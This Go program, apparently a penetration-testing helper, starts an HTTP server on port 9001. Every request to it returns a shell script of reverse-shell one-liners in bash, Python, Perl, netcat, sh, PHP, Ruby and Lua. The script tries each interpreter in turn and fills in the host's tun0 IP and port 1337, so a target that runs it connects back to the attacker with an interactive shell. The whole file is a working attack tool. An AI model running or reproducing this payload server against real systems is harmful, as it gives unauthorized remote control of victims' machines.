
package main
import (
	"net/http"
	"log"
	"io"
	"net"
	"strings"
)


func GetInternalIP() string {
    itf, _ := net.InterfaceByName("tun0") //here your interface
    item, _ := itf.Addrs()
	var ip net.IP
    for _, addr := range item {
        switch v := addr.(type) {
        case *net.IPNet:
            if !v.IP.IsLoopback() {
                if v.IP.To4() != nil {//Verify if IP is IPV4
                    ip = v.IP
                }
            }
        }
    }
    if ip != nil {
        return ip.String()
    } else {
        return ""
    }
}


func main() {
	route_shell := func(w http.ResponseWriter, _ *http.Request) {
		ip := GetInternalIP()
		shells := `
if command -v bash > /dev/null 2>&1; then
	bash -c 'bash -i &>/dev/tcp/IP/PORT 0>&1'
	exit;
fi
if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/IP/PORT 0>&1
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	exit;
fi

if command -v lua > /dev/null 2>&1; then
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi`
		log.Default().Println("Nueva conexion.")
		io.WriteString(w, strings.ReplaceAll(strings.ReplaceAll(shells, "IP", ip), "PORT", "1337"))
	}
	http.HandleFunc("/", route_shell)
	log.Fatal(http.ListenAndServe("0.0.0.0:9001", nil))
}
